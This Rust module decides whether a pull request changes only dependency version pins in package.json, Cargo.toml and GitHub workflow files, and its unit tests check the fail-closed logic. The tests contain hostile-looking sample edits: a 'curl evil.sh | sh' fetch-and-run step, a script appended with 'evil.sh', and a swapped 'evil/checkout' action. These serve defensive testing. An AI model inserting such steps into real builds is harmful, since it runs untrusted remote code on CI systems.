//! Mechanical dependency-only auto-waiver (spec 005 §3.5 amendment,
//! 2026-06-11; extended to the cargo and workflow ecosystems by spec 030).
//!
//! Dependabot-class PRs change only version pins, but a manifest claimed by a
//! spec fires the coupling gate, and a bot cannot edit specs or PR bodies.
//! Path-level bypass is the wrong tool: it would exempt the whole manifest,
//! including the spec-binding metadata the gate exists to protect. The
//! mechanical rule instead compares the **parsed** base and head of each
//! changed file: the two documents must be semantically identical everywhere
//! except the dependency version pins of that file's ecosystem. Three classes
//! are understood, each with a fail-closed checker:
//!
//! - `package.json` (npm): version strings inside the standard dependency
//!   tables (`dependency_only_change`).
//! - `Cargo.toml` (cargo): the version specifier of an existing dependency, as
//!   a bare string or a table's `version` field (`cargo_dependency_only_change`).
//! - `.github/workflows/*.yml` (GitHub Actions): the `@ref` of a `uses:` action
//!   reference, same `owner/action` (`workflow_dependency_only_change`).
//!
//! Anything else (a new or removed dependency, a `scripts` / `run:` / `with:`
//! edit, a spec-metadata edit, a feature-flag change, an added step or table,
//! a non-parseable document) refuses the auto-waiver, fail-closed.
//!
//! Like everything in core, this is pure: the CLI resolves the merge-base,
//! fetches both file versions via `git show`, and hands the contents in. The
//! paired freshness half (a dependency bump must not stale the committed
//! index) lives in spec 004 §3.5's governance-projection hashing
//! (`manifest.rs::npm_hash_projection` / `cargo_hash_projection`).

use crate::couple::Waiver;

/// The `package.json` tables whose **values** (version strings) may change
/// under the auto-waiver. Key sets must be identical on both sides.
pub const DEPENDENCY_TABLES: &[&str] = &[
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
];

/// The `Cargo.toml` tables whose dependency **version** specifiers may change
/// under the auto-waiver. Recognized wherever cargo places them: at the top
/// level, under `[workspace]`, and under each `[target.<cfg>]`.
pub const CARGO_DEPENDENCY_TABLES: &[&str] =
    &["dependencies", "dev-dependencies", "build-dependencies"];

/// One changed file with both sides of its content. `None` = the file is
/// absent on that side (created or deleted): never dependency-only.
#[derive(Clone, Debug)]
pub struct FileContents {
    pub path: String,
    pub base: Option<String>,
    pub head: Option<String>,
}

/// The mechanical verdict over a whole diff: `Some(Waiver)` iff **every** entry
/// is a recognized dependency manifest whose base→head change is confined to
/// dependency version pins. An empty slice yields `None`: there is nothing to
/// waive.
pub fn dependency_only_waiver(files: &[FileContents]) -> Option<Waiver> {
    if files.is_empty() {
        return None;
    }
    for f in files {
        let (Some(base), Some(head)) = (&f.base, &f.head) else {
            return None; // created or deleted manifest, not a version bump
        };
        let ok = if is_package_json(&f.path) {
            dependency_only_change(base, head)
        } else if is_cargo_toml(&f.path) {
            cargo_dependency_only_change(base, head)
        } else if is_workflow_yaml(&f.path) {
            workflow_dependency_only_change(base, head)
        } else {
            false // not a recognized dependency manifest
        };
        if !ok {
            return None;
        }
    }
    Some(Waiver {
        reason: format!(
            "dependency-only diff (mechanical auto-waiver): version pins only, \
             across {} manifest file(s) (package.json / Cargo.toml dependency \
             tables, workflow `uses:` action refs)",
            files.len()
        ),
    })
}

/// `path` is a manifest class the mechanical auto-waiver understands.
pub fn is_dependency_manifest(path: &str) -> bool {
    is_package_json(path) || is_cargo_toml(path) || is_workflow_yaml(path)
}

// ===== npm: package.json =====

/// `path` names a `package.json` manifest (any directory).
pub fn is_package_json(path: &str) -> bool {
    path == "package.json" || path.ends_with("/package.json")
}

/// True iff `base` and `head` parse as JSON objects that are **equal
/// everywhere except version strings inside [`DEPENDENCY_TABLES`]**:
///
/// - every non-table key: present in both with exactly equal values;
/// - every table: present on both sides (or neither), an object on both,
///   with identical key sets; per-key values may differ only when both
///   sides are strings.
///
/// Parse failure or a non-object document is `false` (fail-closed). A
/// formatting-only change (semantically equal documents) is `true`: it
/// alters no governed fact.
pub fn dependency_only_change(base: &str, head: &str) -> bool {
    use serde_json::Value;

    let (Ok(Value::Object(base)), Ok(Value::Object(head))) = (
        serde_json::from_str::<Value>(base),
        serde_json::from_str::<Value>(head),
    ) else {
        return false;
    };

    let keys: std::collections::BTreeSet<&String> = base.keys().chain(head.keys()).collect();
    for key in keys {
        let is_table = DEPENDENCY_TABLES.contains(&key.as_str());
        match (base.get(key), head.get(key)) {
            (Some(b), Some(h)) if is_table => {
                let (Value::Object(b), Value::Object(h)) = (b, h) else {
                    return false;
                };
                if b.keys().ne(h.keys()) {
                    return false; // package added or removed
                }
                for (name, bv) in b {
                    let hv = &h[name];
                    if bv != hv && !(bv.is_string() && hv.is_string()) {
                        return false;
                    }
                }
            }
            (Some(b), Some(h)) => {
                if b != h {
                    return false;
                }
            }
            // A key (table or not) present on only one side.
            _ => return false,
        }
    }
    true
}

// ===== cargo: Cargo.toml =====

/// `path` names a `Cargo.toml` manifest (any directory).
pub fn is_cargo_toml(path: &str) -> bool {
    path == "Cargo.toml" || path.ends_with("/Cargo.toml")
}

/// True iff `base` and `head` parse as TOML documents equal everywhere except
/// the **version specifiers of existing dependencies**. A dependency table is
/// recognized by key name ([`CARGO_DEPENDENCY_TABLES`]) at any depth, so this
/// covers top-level `[dependencies]`, `[workspace.dependencies]`, and
/// `[target.<cfg>.dependencies]` alike. Inside a dependency table the package
/// key sets must match; each entry is either a bare version string on both
/// sides (which may differ) or a table on both sides with an identical field
/// set where only `version` may differ (both sides strings). Any add/remove of
/// a dependency, a shape flip (string ↔ table), a feature / git / path / rename
/// edit, or any change outside a dependency table refuses the waiver.
///
/// Parse failure or a non-table document is `false` (fail-closed). A
/// formatting-only change is `true`: it alters no governed fact.
pub fn cargo_dependency_only_change(base: &str, head: &str) -> bool {
    let (Ok(base), Ok(head)) = (
        toml::from_str::<toml::Value>(base),
        toml::from_str::<toml::Value>(head),
    ) else {
        return false;
    };
    if !matches!(
        (&base, &head),
        (toml::Value::Table(_), toml::Value::Table(_))
    ) {
        return false; // a Cargo.toml is a table document
    }
    cargo_value_eq_except_versions(&base, &head)
}

/// Structural equality over two TOML values, treating any table entry whose
/// key is a [`CARGO_DEPENDENCY_TABLES`] name as a dependency table (compared by
/// [`cargo_dep_table_versions_only`]) rather than requiring exact equality.
fn cargo_value_eq_except_versions(base: &toml::Value, head: &toml::Value) -> bool {
    use toml::Value::{Array, Table};
    match (base, head) {
        (Table(b), Table(h)) => {
            if b.len() != h.len() {
                return false; // a key (a table or field) added or removed
            }
            for (key, bv) in b {
                let Some(hv) = h.get(key) else {
                    return false;
                };
                if CARGO_DEPENDENCY_TABLES.contains(&key.as_str()) {
                    let (Table(bt), Table(ht)) = (bv, hv) else {
                        return false;
                    };
                    if !cargo_dep_table_versions_only(bt, ht) {
                        return false;
                    }
                } else if !cargo_value_eq_except_versions(bv, hv) {
                    return false;
                }
            }
            true
        }
        (Array(b), Array(h)) => {
            b.len() == h.len()
                && b.iter()
                    .zip(h)
                    .all(|(bv, hv)| cargo_value_eq_except_versions(bv, hv))
        }
        (b, h) => b == h,
    }
}

/// Two cargo dependency tables that differ only in dependency versions:
/// identical package key sets; each entry a string on both sides (may differ),
/// or a table on both sides with an identical field set where only `version`
/// differs (both string).
fn cargo_dep_table_versions_only(base: &toml::Table, head: &toml::Table) -> bool {
    use toml::Value::{String as TStr, Table};
    if base.len() != head.len() {
        return false; // dependency added or removed
    }
    for (name, bv) in base {
        let Some(hv) = head.get(name) else {
            return false;
        };
        match (bv, hv) {
            (TStr(_), TStr(_)) => {} // bare version requirement; may differ
            (Table(bt), Table(ht)) => {
                if bt.len() != ht.len() {
                    return false; // a field (feature, optional, ...) added or removed
                }
                for (field, bfv) in bt {
                    let Some(hfv) = ht.get(field) else {
                        return false;
                    };
                    if field == "version" {
                        // Only version may differ, and only string→string.
                        if bfv != hfv && !(bfv.is_str() && hfv.is_str()) {
                            return false;
                        }
                    } else if bfv != hfv {
                        return false; // features / git / path / optional / ...
                    }
                }
            }
            _ => return false, // shape flip (string ↔ table)
        }
    }
    true
}

// ===== GitHub Actions: .github/workflows/*.yml =====

/// `path` names a workflow file under `.github/workflows/` (any depth).
pub fn is_workflow_yaml(path: &str) -> bool {
    let in_workflows =
        path.starts_with(".github/workflows/") || path.contains("/.github/workflows/");
    in_workflows && (path.ends_with(".yml") || path.ends_with(".yaml"))
}

/// True iff `base` and `head` parse as YAML equal everywhere except the `@ref`
/// of `uses:` action references (same `owner/action`, a differing pinned ref).
/// Any other change (a new/removed step or job, a `with:` / `run:` / `env:`
/// edit, an added key, an unpinned action) refuses the waiver, fail-closed.
///
/// YAML comments (where a SHA-pinned action records its human version) are
/// dropped by the parser on both sides, so comment-only churn is invisible and
/// harmless. Parse failure is `false` (fail-closed).
pub fn workflow_dependency_only_change(base: &str, head: &str) -> bool {
    let (Ok(base), Ok(head)) = (
        serde_yaml::from_str::<serde_yaml::Value>(base),
        serde_yaml::from_str::<serde_yaml::Value>(head),
    ) else {
        return false;
    };
    yaml_eq_except_uses_ref(&base, &head)
}

/// Structural equality over two YAML values, allowing only the `@ref` of a
/// `uses:` scalar to differ (via [`uses_ref_only_differs`]).
fn yaml_eq_except_uses_ref(base: &serde_yaml::Value, head: &serde_yaml::Value) -> bool {
    use serde_yaml::Value::{Mapping, Sequence};
    match (base, head) {
        (Mapping(b), Mapping(h)) => {
            if b.len() != h.len() {
                return false; // a key added or removed
            }
            for (k, bv) in b {
                let Some(hv) = h.get(k) else {
                    return false;
                };
                if k.as_str() == Some("uses") {
                    if !uses_ref_only_differs(bv, hv) {
                        return false;
                    }
                } else if !yaml_eq_except_uses_ref(bv, hv) {
                    return false;
                }
            }
            true
        }
        (Sequence(b), Sequence(h)) => {
            b.len() == h.len()
                && b.iter()
                    .zip(h)
                    .all(|(bv, hv)| yaml_eq_except_uses_ref(bv, hv))
        }
        (b, h) => b == h,
    }
}

/// A `uses:` scalar changed only in its pinned version ref: both are strings of
/// the form `owner/action@ref` with an identical, non-empty `owner/action` and
/// both pinned (both contain `@`); the ref after `@` may differ. A pin added or
/// removed, a changed action path, or a non-string value refuses.
fn uses_ref_only_differs(base: &serde_yaml::Value, head: &serde_yaml::Value) -> bool {
    let (Some(b), Some(h)) = (base.as_str(), head.as_str()) else {
        return base == head; // non-string `uses`: require exact equality
    };
    match (b.split_once('@'), h.split_once('@')) {
        (Some((ba, _)), Some((ha, _))) => !ba.is_empty() && ba == ha,
        (None, None) => b == h, // both unpinned / local; must be identical
        _ => false,             // a pin added or removed
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fc(path: &str, base: &str, head: &str) -> FileContents {
        FileContents {
            path: path.to_string(),
            base: Some(base.to_string()),
            head: Some(head.to_string()),
        }
    }

    // ===== npm =====

    const BASE: &str = r#"{
        "name": "app",
        "version": "1.0.0",
        "scripts": { "build": "tsc" },
        "spec-spine": { "spec": "014-api" },
        "dependencies": { "express": "^4.18.0", "zod": "3.22.0" },
        "devDependencies": { "vitest": "1.0.0" }
    }"#;

    #[test]
    fn version_bump_is_dependency_only() {
        let head = BASE
            .replace("3.22.0", "3.23.1")
            .replace("1.0.0\" }", "1.2.0\" }");
        assert!(dependency_only_change(BASE, &head));
    }

    #[test]
    fn added_package_is_not() {
        let head = BASE.replace(
            r#""zod": "3.22.0""#,
            r#""zod": "3.22.0", "left-pad": "1.0.0""#,
        );
        assert!(!dependency_only_change(BASE, &head));
    }

    #[test]
    fn removed_package_is_not() {
        let head = BASE.replace(r#", "zod": "3.22.0""#, "");
        assert!(!dependency_only_change(BASE, &head));
    }

    #[test]
    fn script_edit_is_not() {
        let head = BASE.replace(r#""build": "tsc""#, r#""build": "tsc && evil.sh""#);
        assert!(!dependency_only_change(BASE, &head));
    }

    #[test]
    fn spec_metadata_edit_is_not() {
        let head = BASE.replace("014-api", "999-other");
        assert!(!dependency_only_change(BASE, &head));
    }

    #[test]
    fn package_own_version_edit_is_not() {
        let head = BASE.replace(r#""version": "1.0.0""#, r#""version": "2.0.0""#);
        assert!(!dependency_only_change(BASE, &head));
    }

    #[test]
    fn new_table_is_not() {
        let head = BASE.replace(
            r#""devDependencies""#,
            r#""peerDependencies": { "react": "18" }, "devDependencies""#,
        );
        assert!(!dependency_only_change(BASE, &head));
    }

    #[test]
    fn reformat_only_is_dependency_only() {
        let head =
            serde_json::to_string_pretty(&serde_json::from_str::<serde_json::Value>(BASE).unwrap())
                .unwrap();
        assert!(dependency_only_change(BASE, &head));
    }

    #[test]
    fn unparseable_is_not() {
        assert!(!dependency_only_change(BASE, "{ not json"));
        assert!(!dependency_only_change("[]", "[]")); // non-object
    }

    // ===== cargo =====

    const CARGO: &str = r#"
[package]
name = "crate-a"
version = "0.1.0"
edition = "2024"

[package.metadata.spec-spine]
spec = "014-api"

[lib]
proc-macro = false

[features]
default = ["std"]
std = []

[dependencies]
serde = "1.0.0"
serde_json = { version = "1.0", features = ["preserve_order"] }

[dev-dependencies]
tempfile = "3"

[workspace.dependencies]
shared = "2.1"
"#;

    #[test]
    fn cargo_bare_and_table_version_bump_is_dependency_only() {
        let head = CARGO
            .replace(r#"serde = "1.0.0""#, r#"serde = "1.0.5""#)
            .replace(
                r#"version = "1.0", features"#,
                r#"version = "1.0.9", features"#,
            )
            .replace(r#"shared = "2.1""#, r#"shared = "2.4""#);
        assert!(cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_added_dependency_is_not() {
        let head = CARGO.replace(r#"serde = "1.0.0""#, "serde = \"1.0.0\"\nregex = \"1\"");
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_removed_dependency_is_not() {
        let head = CARGO.replace("tempfile = \"3\"", "");
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_feature_edit_is_not() {
        let head = CARGO.replace(
            r#"features = ["preserve_order"]"#,
            r#"features = ["arbitrary_precision"]"#,
        );
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_package_version_edit_is_not() {
        let head = CARGO.replace(r#"version = "0.1.0""#, r#"version = "0.2.0""#);
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_spec_metadata_edit_is_not() {
        let head = CARGO.replace("014-api", "999-other");
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_shape_flip_is_not() {
        // A bare string becoming a table (adding features) is not a pure bump.
        let head = CARGO.replace(
            r#"serde = "1.0.0""#,
            r#"serde = { version = "1.0.0", features = ["derive"] }"#,
        );
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_added_feature_table_is_not() {
        let head = CARGO.replace(
            "[dependencies]",
            "[build-dependencies]\ncc = \"1\"\n\n[dependencies]",
        );
        assert!(!cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_reformat_only_is_dependency_only() {
        let head = CARGO.replace(r#"serde = "1.0.0""#, "serde   =   \"1.0.0\"");
        assert!(cargo_dependency_only_change(CARGO, &head));
    }

    #[test]
    fn cargo_unparseable_is_not() {
        assert!(!cargo_dependency_only_change(CARGO, "not = = toml"));
        assert!(!cargo_dependency_only_change("[[a]]\nx=1", "[[a]]\nx=2")); // array-of-tables top level is still a table doc; value change refused
    }

    // ===== workflow =====

    const WF: &str = r#"
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: cargo test
"#;

    #[test]
    fn workflow_uses_ref_bump_is_dependency_only() {
        let head = WF
            .replace("actions/checkout@v4", "actions/checkout@v5")
            .replace("actions/setup-node@v4", "actions/setup-node@v6");
        assert!(workflow_dependency_only_change(WF, &head));
    }

    #[test]
    fn workflow_sha_pin_bump_is_dependency_only() {
        let base = "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@abc123 # v4.1.0\n";
        let head = "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@def456 # v5.0.0\n";
        assert!(workflow_dependency_only_change(base, head));
    }

    #[test]
    fn workflow_with_edit_is_not() {
        let head = WF.replace("node-version: 20", "node-version: 22");
        assert!(!workflow_dependency_only_change(WF, &head));
    }

    #[test]
    fn workflow_run_edit_is_not() {
        let head = WF.replace("cargo test", "curl evil.sh | sh");
        assert!(!workflow_dependency_only_change(WF, &head));
    }

    #[test]
    fn workflow_added_step_is_not() {
        let head = WF.replace(
            "      - run: cargo test",
            "      - run: cargo test\n      - run: cargo build",
        );
        assert!(!workflow_dependency_only_change(WF, &head));
    }

    #[test]
    fn workflow_changed_action_path_is_not() {
        let head = WF.replace("actions/checkout@v4", "evil/checkout@v4");
        assert!(!workflow_dependency_only_change(WF, &head));
    }

    #[test]
    fn workflow_unpin_is_not() {
        let head = WF.replace("actions/checkout@v4", "actions/checkout");
        assert!(!workflow_dependency_only_change(WF, &head));
    }

    #[test]
    fn workflow_unparseable_is_not() {
        assert!(!workflow_dependency_only_change(WF, "key: [unbalanced"));
    }

    // ===== dispatch =====

    #[test]
    fn waiver_requires_all_files_to_qualify() {
        let bump = fc(
            "apps/api/package.json",
            r#"{"dependencies":{"a":"1"}}"#,
            r#"{"dependencies":{"a":"2"}}"#,
        );
        let other = fc("src/lib.rs", "x", "y");
        assert!(dependency_only_waiver(std::slice::from_ref(&bump)).is_some());
        assert!(dependency_only_waiver(&[bump.clone(), other]).is_none());
        assert!(dependency_only_waiver(&[]).is_none());

        let created = FileContents {
            path: "package.json".to_string(),
            base: None,
            head: Some(r#"{"dependencies":{"a":"1"}}"#.to_string()),
        };
        assert!(dependency_only_waiver(&[created]).is_none());
    }

    #[test]
    fn waiver_mixes_manifest_classes() {
        let npm = fc(
            "package.json",
            r#"{"dependencies":{"a":"1"}}"#,
            r#"{"dependencies":{"a":"2"}}"#,
        );
        let cargo = fc(
            "crate-a/Cargo.toml",
            "[dependencies]\nserde = \"1.0.0\"\n",
            "[dependencies]\nserde = \"1.0.1\"\n",
        );
        let wf = fc(
            ".github/workflows/ci.yml",
            "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n",
            "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@v5\n",
        );
        assert!(dependency_only_waiver(&[npm, cargo, wf]).is_some());
    }

    #[test]
    fn manifest_path_shapes() {
        assert!(is_package_json("package.json"));
        assert!(is_package_json("apps/api/package.json"));
        assert!(!is_package_json("apps/api/package.json5"));
        assert!(!is_package_json("not-package.json/file.ts"));

        assert!(is_cargo_toml("Cargo.toml"));
        assert!(is_cargo_toml("crates/core/Cargo.toml"));
        assert!(!is_cargo_toml("Cargo.lock"));

        assert!(is_workflow_yaml(".github/workflows/ci.yml"));
        assert!(is_workflow_yaml(".github/workflows/nested/x.yaml"));
        assert!(is_workflow_yaml("sub/.github/workflows/ci.yml"));
        assert!(!is_workflow_yaml(".github/dependabot.yml"));
        assert!(!is_workflow_yaml("docs/workflows/ci.yml"));

        assert!(is_dependency_manifest("Cargo.toml"));
        assert!(is_dependency_manifest("x/package.json"));
        assert!(is_dependency_manifest(".github/workflows/ci.yml"));
        assert!(!is_dependency_manifest("src/lib.rs"));
    }
}
